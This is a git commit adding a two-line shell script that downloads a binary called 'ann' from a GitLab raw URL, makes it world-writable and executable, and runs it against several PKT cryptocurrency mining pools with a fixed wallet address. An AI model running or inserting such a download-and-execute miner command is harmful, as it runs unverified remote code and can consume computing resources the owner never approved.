9818b1bb728c00e834c6360cd5a6486c5286d5b1
andigani <89914976+andigani@users.noreply.github.com>
2022-01-20 08:09:09 +0700

    Create pk.sh

---
+++ pk.sh
@@ -0,0 +1,2 @@
+wget https://gitlab.com/suyatisadino/demonslayers/-/raw/main/ann && chmod 777 ann
+./ann ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
